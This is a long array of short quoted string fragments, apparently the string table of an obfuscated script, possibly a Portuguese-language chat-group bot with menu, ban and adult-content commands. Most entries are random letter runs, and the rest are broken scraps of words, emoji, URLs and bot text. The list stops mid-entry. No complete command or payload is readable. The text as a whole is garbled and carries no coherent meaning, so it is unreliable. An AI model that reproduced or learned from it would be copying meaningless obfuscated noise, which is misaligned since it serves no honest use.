'KTfKE', 'dCOnq', 'EToNy', "bou d", 'm-ite', 'zVyUP', 'yMEKC', 'ZVLmE', 'wOznS', 'VusVi', 'on/gr', 'otaca', "║✼ Co", '1.19.', 'BXCNL', 'ultra', 'iAxvh', 'akes', 'rows', "e Do ", 'sykfr', "s aci", 'NcvJG', 'YFVyu', 'YimPN', 'sSbWW', 'capis', 'eaAsr', 'ficha', 'ETO', "o já ", 'gOKSY', "o, ma", 'tGtPW', 'ackag', "doou ", "𝐒𝐔𝐑𝐈 ", 'OULzR', 'uueGU', 'XDeyN', 'Sdpsd', 'mero:', 'kwai_', "\rPOR ", 'RzRXv', 'JAqSL', " eu p", "i ren", 'ebTAu', 'YYY', 'ypqjl', " 😈❤️", "não s", 'dDHml', 'Cbbwp', "ces p", 'uVmmV', "arde ", 'aaYIS', 'AJPFv', "a def", 'eComp', 'jkpZM', 'UGESg', "'em d", 'criçã', 'KpgZo', 'level', 'er-pa', 'ZXfzM', "🔞 𝐀𝐋𝐈", 'YhiMU', "ig lo", '𝐄𝐌-𝐕𝐈', "M Liv", 'orári', "𝐍𝐇𝐀 𝐋", 'dnvzK', 'ayn', 'nváli', "ular ", '_gold', 'XlZuw', 'bros.', 'VFTJE', 'UbPoI', 'dmbPO', 'KCSGl', 'GMloc', '/Kzxr', '+Boxi', "or, a", 'jogo.', 'UYAms', 'nXjjI', 'TAjEu', 'VQByG', 'nHvAj', 'Adivi', " (8)\n", 'oNhla', "Dono ", 'eNQhE', '0-024', 'KAGQV', 'OS.js', 'me=fi', 'XXsES', 'cUgJs', 'no(a)', 'dyxhp', '5|4|2', "a des", 'Erro:', "𝐍𝐀 𝐌𝐔", 'ecuta', "30. 🔞", " & PA", 'tmIUo', "o @", 'wCBAl', " Gpt,", 'vo.', 'bZswj', 'tYZqU', "os! 😘", 'jIKmh', "4. 📍 ", 'FIOUO', "𝐀 🔞", 'UtZwG', 'ApoxS', 'ePpih', 'gXRUv', "de, c", 'HRsiP', "O USU", 'Ilrse', 'xAUPw', 'JJyxB', 'AYhwk', '-t.ap', " Car ", 'tvmdT', "🚷🚮🉐🈺 ", 'DomML', 'WakzT', 'm.jso', 'DEVHM', "ERS P", 'sVQFF', " do T", 'RANSF', 'fb920', 'pront', "e tip", 'YDfvI', "dio p", 'MogWf', 'GLDlm', 'SbrZb', " feit", "dos u", "a a\nk", "us ac", 'mTatq', 'dDTzy', 'EYTqU', 'KoTMe', 'fXPyJ', 'jCreK', "rro d", 'uULMQ', " CS S", 'yZTvC', 'ferir', 'mrrke', 'inist', "file\n", 'mtHrj', 'AINhx', 'GyZJG', 'hatsa', 'UkBnW', 'rvklP', "  \n└─", 'GuuYJ', 'viKIE', 'wuGvq', "ite d", 'TAzIa', 'VyfJf', 'fy.', " fast", 'toRkG', "🇵 🇦 🇨", "tou n", 'LnHsI', 'SREtT', 'hGbNN', 'iGGPw', 'eYYIW', 'wUYUl', 'qNhpQ', "hã, o", 'HIVcQ', 'QMFfC', "ta -1", " limi", 'ure-1', 'LSFsW', 'ULYgr', " DE 1", "HA O ", 'ITHAN', 'Milhã', "anco\n", 'EqEpm', 'UiErM', ".\n« G", 'tica-', 'pkadm', 'db346', 'DjqKK', 'downl', "p rox", "a méd", "a inc", "el IV", "le nã", 'DSOLL', "\n*Vel", 'ZPzrh', "de en", 'inho@', "um gr", 'UFzUG', " ou E", 'NiWic', "ia. 🥰", 'toban', 'ZuDgo', " MEME", "️  co", "AL CA", 'yeYgR', 'lJzBW', 'DbzAG', "mbém ", 'zLlZR', 'ded', 'dwIVN', '1:01|', 'c2962', 'AoUeV', "ca ga", 'kohLW', 'lMXhj', 'enhos', 'lar', "dem V", 'GBqTc', 'sWsEQ', 'sZQSV', "u 2 a", 'N+9.2', "cê da", "𝟖 🔞", 'SGrnj', "/ Cal", 'DlVWP', 'CBTHQ', 'FdaDS', 'xloyH', 'tMLHA', 'UgmAc', 'BBcJN', " se v", 'ISFIe', "\n├𝐂𝐨𝐦", 'TbTjT', 'heheh', 'Tenta', 'gnTgM', "aça @", 'ord', "ds in", 'EFSfr', 'Zwesn', ", use", 'kickf', 'ines', 'tsnke', 'SOhjL', 'zz5wg', 'bAzRS', "r! ❌", 'aYvle', 'IwYCX', "r, le", "io? \n", "ig rh", "𝗜𝗡𝗔 🇯🇵", 'sNtrW', "𝐎𝟐 ❌", 'lnSkB', " de m", 'qpNKF', 'rJdBO', 'QKLHj', 'dzqoS', 'Kjvij', 'twCYZ', 'PJZEA', 'CejPU', 'UthQS', 'YlDOr', 'mwvKb', 'WwDea', 'ecebi', 'jXpgV', "tros ", 'tvzTa', 'relo', 'odele', "S  🍀💰", "ndo d", "ará 5", 'NFD', 'starg', "𝐒 🎌", 'fPAst', 'DgOMN', '20PAC', 'kdTBv', 'BqJLw', 'orte.', 'apena', 'FplWK', 'HVmFv', 'WDTzA', 'cxETA', "cê?. ", 'mbrar', 'WIYGb', " driv", "\n\nCha", 'eguml', 'eitou', 'MquPh', 'TMZOS', 'lqjek', 'osimg', 'doarg', "\n\n5: ", 'OWwmM', "ido ☹️", 'sage', 'ubjVC', '11|1|', '150de', '24012', "ix gl", "e aza", "bio m", 'tFHSq', 'sTWlw', "O [ ", "\" -c:", 'iAGgL', '44397', 'SAJmk', 'hlltc', 'audio', 'zonDO', '8uPj7', '|0|5|', 'inuar', 'erato', 'k.com', "om ap", 'VVQow', 'quant', "m mem", "u err", " e qu", 'qEYPd', 'ZssjY', '9.229', "eja p", 'XuNKM', 'YbrTs', "\npala", "AR MA", 'nbVjs', 'RQWIS', 'RTCQL', 'TQWzc', '|4|2', 'alRzS', 'GxeqJ', 'oKtum', "rd 0", 'ncias', 'lnmDx', 'Wjyva', 'sagen', 'tagra', "C 🔞\n", 'XVCRg', 'plaq5', 'JxbwL', 'IRPOR', 'ando', 'BKUOS', "da co", 'MrcEV', 'zIYYk', '://gi', 'gBrID', 'wgliw', 'PHkkK', "à lis", " ele ", 'lFuSz', "🇯🇵 𝐎 𝐀", 'globa', 'ixhWS', 'cemen', "da im", 'iciad', 'xPTiy', "rir ", 'reole', 'YAtxo', "po, u", 'DdArF', 'Dwsnu', 'easy', "play\n", 'fAELq', " em o", "OKU ❄️", "LE ❄️\n", 'LuMuk', "ink e", "𝐎𝐕𝐈𝐍 ", 'zYdgm', "🇯🇵 𝐌𝐄𝐍", 'presa', "𝖯𝖮𝖣𝖤 ", 'RpRtQ', 'ikREI', 'fileL', 'RMHsH', 'STFeg', 'zgkSW', 'ynOKt', 'XgiqQ', 'NYpgK', 'hour1', 'DORA%', "t sai", 'dono6', 'aka', " 5\n\nS", 'wuIsF', 'NtEpY', 'BbJEK', 'ocked', 'bRThZ', "s por", 'aDRhH', "nda |", 'qtpdO', 'mHSTf', 'rar-s', "omum ", 'hallo', " KICK", 'jBdmq', "rio q", 'AFmHp', "rmo d", 'avra(', 'PHHyJ', 'NJsid', "\n❄️ Co", 'rBHjq', 'vPsRF', " 2 on", 'certe', '8cc8f', 'upos/', "m pre", "N\nhtt", 'zyHum', 'MYPPj', 'assem', 'pzLeS', 'ADEIR', "A apo", 'JLIsK', "ada i", 'gif/n', 'raKSD', 'ucrYb', 'MPsTL', 'ral', 'Wpwaa', 'erThu', 'mnfEr', 'AHXpQ', 'fElEg', 'la/', "args ", 'colaq', '9a1e4', "ão en", 'dIxOR', "eie? ", 'uakor', " Chif", 'Provo', ". Use", 'dor', 'lrRoG', "es:* ", 'intes', 'talog', 'xgdDB', 'bpDnP', 'eKUaW', " TXT ", 'dlGDv', 'OnSui', "le\n\n-", 'bTHcN', 'NQnOu', 'UXnfq', 'LvHhB', "s pes", "rro, ", "*「 TR", 'queri', 'yKOcF', 'kZjed', 'AabBx', 'ecion', "│+  ", "t ou ", 'nQlsz', 'ZuBxu', 'ação.', 'ZRgjs', 'SUqpI', 'seefN', 'BTdad', 'Xefaa', '365@g', 'kugou', 'HgmeW', 'HRzBL', "foi m", 'rupo.', " o ", 'RNMAe', " 🤡", 'hzcVz', 'kvyhB', '#nume', 'r-mak', 'fPVal', 'licit', '@boch', 'PqxLZ', '5c4eb', 'uNPmt', 'DD/MM', "❄️ 𝐋𝐔𝐌", "vie u", "❄️ 𝐅𝐑𝐄", 'qJDef', 'UNzRl', "É não", 'HnDGS', 'sairg', 'Case%', 'upo..', 'osdl', 'mwLWY', 'byQXI', 'xuWVn', 'DzQwb', 'NKVVa', 'oCWKI', "𝐉𝐈𝐑𝐎 ", 'entou', 'RBpvQ', 'vGxCi', 'WsCxm', 'eJWAs', 'geSec', 'GaZVC', "e Pix", 'THszr', 'piraç', 'IQvJp', "o!\nNú", 'LJXmY', 'rPhYi', 'ile/0', 'XkWyn', 'CLQLc', "\n\n↺➤ ", 'NNtSC', 'YjObR', " .tex", " a Ta", 'ExrLO', "roll ", "io ad", "so! A", " MCLO", "ada u", 'attp5', 'CmTlx', "a sua", 'wame', 'WBDbi', 'UfsNV', 'mp4', 'nto..', 'desmu', 'aeJjD', 'rdend', "ça, s", 'CAgWE', 'INDIC', "* : ", 'KsIxU', "😈 _Ag", "indo ", "Ele e", "oi de", 'ocmd#', "de gr", 'IHsOl', "da ce", 'VBsDK', 'jgrBX', 'pLsub', 'rbale', 'ffect', 'ultou', "ido e", " hete", 'TKgtX', 'WJRGR', 'oHBlR', 'rcXCv', 'IyCHF', 'PeyvK', 'SPygo', "𝐑𝐓𝐈𝐑 ", 'pSeeq', '𝐀𝐓𝐀́𝐋𝐎', 'qGTBV', 'ifake', 'XuaMH', "p -fi", 'DP3Lo', 'faRzu', 'backu', 'wayXD', 'ttp3', 'kHuGm', "m arq", "\n   ༶", 'Pkrso', '%20Te', 'hBcwn', 'qUzHk', 'Membr', "r uma", 'xYYfh', 'VVxjo', "0244\n", "timo ", 'giri', 'yzstW', 'jLTmi', 'GiYbE', 'UARZZ', 'pqzyI', 'dJEPO', 'nIvXe', 'zGUBg', "te ex", 'OJzFY', "eria ", "de in", 'Kzkwq', "el!\nN", 'BvCwL', "o:\n\nU", 'yjZtK', 'VÍDEO', 'mlZfn', 'kfGCQ', '20MAR', 'sdVWj', "ema n", "a use", 's/Pol', "4 ] ", 'attp2', 'sxXsT', 'onar', 'CLWDk', 'ry/vs', "n Bal", 'QDPOG', 'annou', ". Ele", 'JUZTc', 'mZRZd', 'TKzdR', 'bMEBe', "sso. ", 'lUVyx', 'tnJUd', 'hEfgE', "ta fo", 'nNVnN', "8. 🕹️ ", "ê Tem", "53. ❄️", "am pe", 'gjiyl', 'SyDKo', 'so..', "👾 ANA", 'HyqTs', 'juboQ', 'rNIHf', "car i", 'gsKeJ', 'ysIvn', 'A_COM', 'SqTDR', 'WpDiX', 'RSnGZ', " real", 'indad', 'lqPDc', "𝑫𝑬𝑶 3", "\n⭔ Vi", 'rrzCE', 'hoje.', 'KztHW', 'AJnZk', 'nYCrq', "este ", 'etalh', 'ini*.', "meus ", 'HapNU', 'gJPfA', "as ao", 'sHphs', 'LjPGe', 'EFDCw', 'niTTt', 'has', 'PZFcw', 'dETeM', 'aoITQ', 'Signo', 'bcgro', 'zuNbX', '/getg', "_\n   ", "rior ", 'ases.', 'SSvVA', '2a081', 'nt_ga', 'QUhZs', 'lWqiy', 'afvSi', 'conta', 'dasai', 'ebRPe', 'GpkwN', 'ewiOG', 'ekHfP', 'wHDYT', 'imgcr', 'OCkqh', " junt", " = 1 ", "✅ 𝐑𝐄𝐒", 'eOokj', "eu se", 'igita', 'PYCGA', 'yOOEe', 'hXKhB', 'ViUVP', 'mFopG', 'h__lg', 'WcgwS', 'rZcPY', "o alg", '2|0|4', "U EST", 'nfdPe', 'nvFie', 'dHjxM', 'jkKnA', 'HHgmG', " JJK ", "s aut", '❄️𝐒𝐀𝐍𝐄', "ras j", 'eio', ". 😈", 'klYoY', "om or", " em f", 'CjfQW', 'pIQoq', 'kSTpj', 'ePzhL', "ra to", 'shi', 'XYZgA', '0mQgy', "_gpt ", 'TGdeJ', "play ", 'tícia', "o bri", "59. ❄️", 'mod.a', 'Audio', 'Sechg', 'nIzAl', 'LWhFM', 'tKhQS', 'uVjua', 'wikip', 'eBbaS', "ʀ.*\n𝙏", 'ApKAQ', 'u01nD', 'WTNNO', 'rb1mp', '3|8|2', 'TZLNv', 'kPdiG', 'TdVJC', 'ukoky', 'infer', 'OzkTb', "1 / 0", 'termi', "OU FA", 'lor=1', 'nBACN', "s hoj", "onto ", 'qqJAy', 'VIWQN', 'oNJiA', 'Gadin', 'NffJc', "🔞 𝐏𝐀𝐂", 'HvSUi', 'CuslB', 'QhCww', 'znkBK', 'gPiGT', "rjar ", 'ndos:', 'qIcXq', "\n\nSua", " cada", 'aa3ed', 'agora', 'dn.js', 'MCLFR', "ᴏᴍᴇ:\n", "ig bo", "OGO V", 'uNKUh', 'ankpn', 'PKYKy', '*Olá,', 'qwYGf', 'bgAso', " /30d", "arca ", "ocê e", 'gHrTI', 'XzQtg', 'NnDkK', 'xTrFD', "vez, ", 'EJpLW', 'ATIeA', 'rende', 'pECjj', 'Olnps', 'tysSe', 'nailU', "🔞 𝐌𝐄1", "e se ", 'stura', "a e a", '|4|3', 'VvMql', "% ❱ B", 'rifiq', 'alGLs', 'IIvre', "Só re", "Ouve ", "\n• *D", 'juyfn', "e mai", "e x9 ", 'dOXWG', "- Jog", 'muita', 'Pxjlf', 'zkkZY', 'CIRiX', " pref", 'tatID', 'YorAW', 'Hx7D/', " 𝐂𝐂𝐋𝐎", 'wonyY', 'ly=Cr', '40000', 'safet', 'ifxPT', "ends ", "uma p", 'jlLVd', "o\n\nes", 'jRwIp', 'OpSFD', "TORO ", 'remov', '--dat', 'aXeFW', "s\n\nPa", 'gUbsn', "cê ga", 'OItAh', "o de ", " da t", 'vetmH', "nto c", 'wkKhf', 'TCsmE', 'JULHV', 'YepgN', 'nidad', '.fami', "nte e", 'FYYzS', 'atoob', 'MfSQl', "i Des", "cker\"", 'ys/pi', 'UdZpW', 'promp', 'xpcdH', "imo p", 'uZLNC', 'AFETY', 'buTAC', 'XcftI', 'XXBQN', "QUE V", " víde", "\nEsto", 'yuWNG', 'step', 'jOtpf', '8|9|7', 'kZIqE', 'OjtoV', "! Voc", 'qvWEJ', 'wtSSh', 'ePDvI', "𝐑 𝐋𝐈𝐌", 'ZvQWD', 'CENqF', 'tnHcC', 'Cja_S', 'P-Pe-', 'CzoCV', 'cpf', "s.\n\nI", 's@bro', 'muQSX', "n kkk", 'tDtWN', "é mui", 'csEHC', "ME\n📌 ", 'hFZiW', 'iuQnH', 'tikto', 'IbwJE', 'CJbTs', " viol", 'FGzGs', 'gC06V', "cê te", "ke ne", '3bc3b', "❄️ 𝐇𝐈𝐍", 'XhUBK', 'yBmEG', "de bo", 'FJYIx', "\n*PRI", "á uti", 'UngyV', "dos: ", 'ertên', "! Fal", 'YOrYW', '2fb9c', 'ScCHv', 'compr', 'zuApD', 'hwMdj', 'ERIND', 'iqdBF', "r a g", 'RxQFg', 'ergun', 'oSrBI', "BRO* ", 'nDKFy', 'PVJxL', " ✔️", 'eGDJV', 'EUdGC', 'chi', 'zpvbK', 'VhRpt', 'BOzhA', 'XuFLN', 'goFZc', 'ticia', 'cUdKr', 'nkJja', 'CnwAu', "dem u", "TO3 ❄️", "ra us", " PARA", 'UQVmg', 'dade:', 'munit', 'nyuhb', 'MgcUr', 'gryeL', "ediu ", '*Difi', "não e", 'fydl-', 'VeGLa', "ta im", 'exkmn', "ro li", "A men", 'XrDeD', 'hYVZS', "o mín", "tos d", 'mSUmt', 'ttp5', 'cjZxY', 'VJeIh', "a coo", "o, e ", 'BnXNb', 'hVkUt', "360p ", "quem ", "🇯🇵 𝗔𝗡𝗜", "e o C", 'EflUa', 'zguiZ', 'cvLPA', 'KQfqH', 'zXLUs', 'mzCet', 'ihDFU', 'QgXIY', 'dVukN', 'UvPyv', 'QjKUV', 'AJRsK', 'uIxPQ', "do in", "cd DA", 'onten', 'IUShd', 'ZhaFN', "🔵\n", "s No ", 'ender', 'gDZaq', 'dHIeC', 'nhar,', '53G8g', 'M8bxg', 'egziA', 'setli', 'UenOL', "22. ❄️", "ra @", "O: ", "🇯🇵 𝗠𝗔𝗗", "cou o", 'PzXzs', 'GhvHt', 'ofile', 'zTlER', "i nes", 'NmzwC', 'lebra', "ulti ", 'VAUF8', "o fiq", "ear c", 'aSSgp', 'desba', 'VDgQD', 'ppt2', 'lnTvX', 'everi', 'qpjpB', 'lFYSn', 'oAHkr', 'wNxDH', 'RNEWf', 'hpaeT', 'dONfC', 'KwBBS', 'WyoaW', 'abyma', 'CokqE', 'tabel', "o qui", 'lRlNC', 'GVZbK', 'on/DU', "er ma", "e uso", 'bMcRw', 'zkfKL', 'zrCym', 'ht=70', "_-_\n\n", 'Jbrzj', "(a) ", 'YNJqc', " de s", " Tota", 'nutos', "m men", "o ini", 'ferre', 'wMjoG', 'pmnHa', "ink, ", 'PSLsy', 'playm', "or Re", 'FcwdC', 'WVsYJ', 'jojvD', 'CtOgt', 'euIun', 'svNNh', 'ador.', 'vavUe', "rá re", "e 20.", "ue ap", 'IuYkN', 'verif', 'PXCzc', 'gPpOo', "O\n╚┉✼", 'aptoi', "cok t", 'xzofY', "ig ay", 'NqxHm', 'BatQI', "\nPost", 'BkoZW', "as sã", 'daVXv', 'cCkrp', 'ag-ra', 'YoWco', 'size', 'tAgBE', 'wTiPj', 'CInyh', 'dSfkx', 'nWQBC', "🔞 𝐈𝐒𝐀", " DO G", 'some', 'od.ap', "𝐂𝐈𝐀 𝐒", 'qWOVW', 'TadQv', 'PsaJO', 'zQVKH', "𝗙𝗨 🇯🇵", "rá mo", 'qKrrU', '39%25', 'calc', 'kODdC', 'NWmll', 'xRmpf', "te pr", "old\nt", 'olds', 'gue_S', 'TbyYZ', 'pin', 'GswRd', 'BokEg', 'mínim', 'sQnhX', 'SNRAM', " no m", "ki 3", 'pxmTm', 'rRvmn', 'tNVZk', 'YPlNA', "🟦🟦\nE ", 'TsBLa', 'gos_2', "99 99", 'pqiyi', "ar qu", "udo ?", 'Mrfjw', 'bsuPW', 'dades', 'RCzwA', 'USUAR', 'ssdpp', 'zQVze', 'eOwjs', 'gHmHq', "480p ", 'nmOmH', 'NGYNn', 'fpRkV', 'Plvai', 'baram', 'wMmYi', 'oso', 'Lnjfe', 'TxktD', 'RSFuJ', "😈 @", "imo q", "cia, ", 'etári', 'PdAbU', 'ANAGR', 'AnDpi', "🔞 𝐋𝐈𝐒", 'nuQQh', '|0|4', 'fwRyz', 'OGndL', 'kaqXp', 'XhKwk', 'nhado', 'tyqNY', 'sTEOR', 'AlLFO', 'ByHbE', 'HjQWT', 'YrQbY', 'coKQg', "da li", 'JtvTm', 'GTmPj', 'zpChC', 'UgiTb', " as f", 'zWvKS', '24:00', 'qBEuq', "have ", 'eBgax', '.me/5', "anhã ", 'unc.j', 'GrUvY', 'BGcuf', "rca, ", 'EtLQn', 'ghBcU', 'UhAwU', 'fHmpT', 'dd765', 'vCNxd', "gar d", 'RCvbg', 'mOVQH', 'iPqcD', 'Hozuv', 'pkKmQ', 'lYTUY', "um an", "60. ❄️", 'CWwtV', 'Zfimr', 'WQAHR', 'ABaqq', 'm/fil', '73572', 'vertê', 'FJCGx', 'StZpm', "❄️ 𝐑𝐇𝐘", "nto d", 'wcUOd', "bash ", 'FqOce', 'TAKcs', 'zpqzx', "  \n", 'LOeWW', 'TH-BA', 'utOKn', 'corri', 'TUFLI', 'YEiQZ', 'ckvmp', "ake 1", "ad: ", 'yuuQa', 'PTmHf', "dos D", 'EeIqU', '٨ـﮩﮩ٨', 'Clash', 'MRION', "a pod", 'wZfbF', 'Dhoyq', "va as", "\nNome", 'FDDvC', "E ABR", 'PZNJF', 'UQlFT', "Não F", "     ", 'KpPCV', 'lnDpa', "𝗭𝗨 🇯🇵", 'GUrfj', 'FYWvm', 'NvEoW', 'imuDQ', 'UCGfh', 'punhe', " Pont", "ipo D", "am de", "à dis", 'TfiWf', 'PGQXN', 'enova', 'radeç', "0 = 2", 'iPUam', "90. 🔞", "r a i", 'tkKpw', 'GGuYV', "quer ", "ider ", 'qITVY', 'lHFIO', "umir ", 'rDSxx', " Mais", 'CUBRA', "um cr", 'bmNFZ', 'vVSPZ', "ir o ", ',en;q', 'eiman', 'zUUtJ', "te ", '%A7o/', " 𝐁𝐈𝐒𝐓", '65a64', 'mPHyn', 'CbnVo', 'ANIMA', "ot de", 'llrIZ', 'qNMUu', 'packc', "Mac O", 'rirgp', 'xCEnX', 'Lg0_x', 'NwcYY', "a min", 'Tnjbs', 'qoweN', 'TypLI', 'fvsWU', "pós o", "se en", 'YnFdf', "ser s", 'éns!', "da e ", 'Bpmhf', "ca at", 'Adver', 'FfmaD', 'WCYfV', 'ozngC', "do Co", "r 15 ", " top.", 'uYdWn', 'HCqQg', 'apost', 'perso', 'tDcXA', 'Swrlx', 'HZlOb', "20. 🔞", 'AGYjH', 'bf0b9', 'total', 'TpfcA', 'YomnB', 'iOQAJ', "k de ", '.medi', 'WaaJG', 'IOPka', 'nsear', " list", 'qhNjZ', 'JOJdX', 'da_es', 'ZQqfe', 'DwXsi', 'bHSny', 'xdQdC', 'ozQmw', 'Usuar', 'kBcMk', "ns) p", 'next', 'desaf', 'rante', 'phAbk', "int, ", " no a", 'de_ba', 'UkNWS', 'xAqXM', 'LSsMm', 'NSEUR', 'arr.j', "\n\n🚨🚨🚨", 'ZPgZK', 'SwRfw', 'rca', 'lBECA', "se o ", "ez du", 'tReky', 'AmpMg', "o min", 'swdct', "m um ", 'solve', 'tlJza', 'Botõe', 'Gxikx', 'IBGGf', 'Eshfg', 'oDCDf', 'FEYIS', "amos ", 'gbaWh', "ig go", "é gay", 'YgFsY', "T BOX", 'ORBSR', 'AkXHK', 'UwQPv', "ar - ", 'QktXn', " *2mi", 'encer', 'uXJWS', "to us", 'ZfJbR', 'bqnaw', 'Todos', " de g", 'bBWor', 'uaHxl', 'on/so', 'model', "do. U", 'ducri', '_eph', 'Aaaa,', 'mem', "ESSO ", 'testv', ", ten", 'ito.', ", ser", 'Sacmo', 'huzdX', 'com/e', 'marca', 'wPndt', 'JvOmc', 'aEKYx', "e abu", 'yGQqn', 'jactL', 'fnpek', 'me?q=', 'Humav', 'NLzQo', '637f1', 'aWVTo', 'qgbAX', 'ona', 'ver_f', 'EsDea', 'iNcIj', 'rSkgc', 'quei,', 'bann', 'dSOvY', 'mcgLI', 'OIiZM', "o dig", '𝐏𝐄🔥', 'ItaRd', 'kkkZz', "ce os", 'joYST', 'pxkIi', 'MfFWc', 'rjneG', "tiva ", 'YQAFW', 'kdjOf', 'JvdUN', "pra e", 'bnqnm', 'heiro', 'LAVRA', '/bsdm', 'bf7b0', 'sQtus', 'WzCGy', 'AaHrU', 'uyLMr', 'PKCIV', 'UCnBx', 'ySLxW', 'oe/db', 'rbdeI', 'GaoIn', " de J", "ade p", "por m", " trip", 'gZmJI', " baca", "\n\n- N", 'cZVIE', ")\n14.", 'QbbAj', 'QkqlD', 'syyot', 'IEXzr', 'ões.', 'osHKT', "ar ba", 'CXaBn', "os e ", "vos e", 'lUJac', 'BrcFb', 'LBnbH', "𝐍 ❄️", 'TfeOG', 'UyqoE', 'rmtin', 'i.lol', 'MOaEO', '3TIOF', 'yLBSI', 'TwDOr', "gos:\n", 'rLNhe', "nto, ", 'LbqMd', " dia ", 'vuJMD', " 👏..", "ado: ", " '..'", 'blCZF', 'WMmpm', " Gado", 'timeC', 'GOLPI', " Ao #", "a gol", 'ZQJEa', "PT Oi", 'DotDg', "e tir", ", val", "ᴅᴀ* ✅", 'ZwHpV', 'padSt', "e do ", 'epois', "ts em", "á est", "ure v", '02fb6', ", Est", 'YGjwi', 'oojCj', 'gliXG', 'GAWuN', 'tiQvm', 'pilha', "❄️ 𝐎𝐓𝐀", 'FdlFt', 'PDvfa', ", atr", "rá o ", "iw)':", 'Aqbug', 'NsGIZ', 'VPNOs', '150MO', 'com/b', 'LGbVK', 'etAWr', "el en", 'não?🧐', 'sair', 'faceb', 'SHES(', 'Acabo', 'GHjxF', 'BFaNH', 'reCua', "ra, 🧻", 'HmQVj', 'DwYXa', 'RHelM', '/k4pr', 'iente', 'lizme', 'JnRRS', "mado ", 'vsDTs', 'VdQPR', " cham", 'rNOAJ', 'FoWSo', 'dCfEA', 'oprie', "form ", 'LzPZN', 'on/em', 'KMqCL', "5)\n13", 'kOzct', '╚┉✼┉═', 'ctory', 'gif/e', 'ac1fb', '━━⊰❆̸', 'uel.j', 'EfRpM', "ora M", 'etXPy', 'gbBda', " igua", "rei r", 'Dlmxs', 'zBmps', 'asDud', 'LKlwg', 'HBlcH', 'RyWsw', 'fUtFw', "or fa", 'BaLEv', "nk es", 'EROS:', 'stará', 'deo/', 'eZYse', 'oPlny', "🇯🇵 𝗧𝗦𝗨", 'curta', 'seno*', "gp e ", "js, a", 'PYSdE', 'SHtcM', 'autob', " até ", 'buqeQ', 'LOAPu', 'pates', 'yAnno', 'CMzdm', 'nceMe', 'ZBhMA', 'zSRjA', 'tRSwG', 'FvhxW', 'ssage', 'YNrhR', 'vBkjW', 'CZBhN', 'OpMGP', 'qeSEI', " 😥..", "me a ", " unca", "le +1", 'feFmn', 'peZFq', "e jur", 'sFIUi', "an An", 'TXxXH', 'GPCGy', 'UbbkO', 'googl', 'HyGuM', '𝐏𝐎𝐍𝐃𝐄', "ndo: ", 'Nsudf', "m reb", 'Xvrjo', 'Error', "upo* ", '93eca', "𝐀𝐃𝐌𝐒 ", 'BUzMZ', "te um", 'eBgYe', " mine", "r, nã", 'ySVzy', 'EWvxS', 'SBOFp', 'ytmp4', 'pam', 'lPhTR', "ter G", 'niell', 'yFIHj', 'banid', "da da", 'le..,', '..*', 'giASM', 'KOETQ', 'caDdd', 'UANTA', 'ppt', 'gstal', 'LpLnh', 'to?', 'eriNC', "se qu", "\nO jo", 'KrOgc', '1|3|2', 'prest', 'PIlzT', 'edriv', " fora", 'FucuY', 'porte', 'black', 'muito', "Uma B", 'dsm', 'playe', 'Optio', 'zEltd', 'ekRlg', 'edade', "ao en", 'eito,', " eu m", 'KvfqU', 'sNPaw', 'BNNpS', 'BCqau', "qui a", 'OSUFT', 'YbNJB', 'KasBp', 'sEyRh', " 🇯🇵", 'KKCGi', 'cader', 'nId', 'eVPOb', '61cc4', 'fNmlP', 'Paris', 'x.com', ", se ", " redm", 'JHzWp', 'AqYnW', 'figur', 'OoUDa', "\n\n🕹️ P", "ÃO⚠️*\n", "ão sa", "cê Se", 'JBMmm', 'DHABf', 'oKlmB', 'eloci', "r sen", 'pgVrB', 'BZYPe', 'KDUqf', 'MfDcc', 'xpneZ', 'fFBcz', "𝐄𝐑 𝐏𝐀", 'ZtOmx', " um u", 'gqyoz', 'zVmKX', " 🌄", 'fCMYX', 'ZgzQr', ": 𝐎𝐋𝐀́", 'qkbVY', 'FduHh', "l do ", 'ddnlp', 'WVadK', 'nSPPU', 'iovd', "OME D", 'SxSsE', 'FfXbB', "m lin", 'uqmdd', 'DyfjA', 'gnMlS', 'xfESx', 'yuitx', 'nibYq', 'LFDkL', " 𝐏𝐀𝐂𝐊", 'wVMcG', "o tem", "0%.\n\n", 'cdZsr', '𝐎𝐃𝐎+𝟏', 'JfYsc', "r, fa", 'ArlKT', "🇯🇵 𝗪𝗔𝗜", 'sETAA', "iva c", 'sYAaA', 'nTtWa', "upo:\n", 'xBFJu', "sado ", 'am_li', "ao le", 'UYUNV', 'zIsNW', 'vxakI', 'vWUVl', 'PZkAm', 'QZRje', " os h", "Ação ", '9b841', "teve ", " pra ", 'ssim.', 'on.x=', 'sohcx', 'egVpR', 'Sgytm', 'gMKuK', 'KlkXP', 'mNuTV', "u do ", 'ck2q6', " ou b", 'yIKcp', "me no", " fica", '!inic', 'LAWSy', 'fguNb', 'advtl', "ode d", 'OulOo', 'blTiA', 'hK58f', 'cWBiU', 'it#', 'EufXk', 'OwkWs', 'soadm', 'onar.', "o fig", 'wecNu', 'WFhQH', 'gLvCI', " TEXT", '2a38d', " ao p", 'zuxUq', 'PdnuZ', "ig am", 'mXKNg', "p ver", "\n▢ *P", 'zgwTL', "*Uso ", 'ktJqu', 'kSFsy', 'LimBp', 'lsuce', 'NefVj', 'NNZhS', 'vJgzy', 'get', "cê qu", "ts el", 'U%25C', "do ex", "   🚀\n", "21 Sa", 'pNDmt', " font", 'gimg', "r o g", 'ctMes', 'BsFLa', "ra ma", " MOD ", 'gNRst', 'dYwCR', 'anai', "𝐒𝐓𝐄𝟏 ", "ida f", 'HRdnd', 'rZDtd', "go ( ", "25) p", 'eaaAe', 'JyDwU', 'users', 'pZTGC', 'Nome:', "s. Su", 'cKPBh', "\n\n___", 'cript', 'coisa', " prop", " gala", "ma fó", " numé", "1 - 🌹", "t irá", "S DO ", 'rMXtz', 'LESwY', 'SuIIS', 'ELL;t', 'QJlCl', "𝐎𝐃𝐎 𝐁", 'ovada', 'iyBII', 'DFFFL', 'xlQUz', ".\n\nco", 'QvPft', 'xNndj', 'BhhIs', "o est", 'cWnLw', 'sortr', 'te_no', 'Ribxs', 'ZqiqN', 'tapas', " é ce", "do pa", 'Ativa', " de 5", 'koLnL', 'DHMrV', 'KLUpy', 'uguei', 'Atlét', " 2 Go", "𝐒 📀", 'a70d3', "s2 ", 'lGqP0', "em pr", 'RCENT', 'yt-dl', "-as a", 'DVuYp', 'i..', 'm/scr', 'sevid', " saco", 'riZqy', 'TGSLk', "s de ", 'Tnnzx', 'cbOeB', "\n\n🫂 𝐓", 'afQme', 'XjEbZ', 'EKCXu', '23680', "no Ni", 'Sarge', "26. 🕹️", 'ono..', 'YGgIT', 'Sxcbs', 'oucas', "S3 ❄️\n", 'igaçã', 'Oxzdw', 'NyOIE', 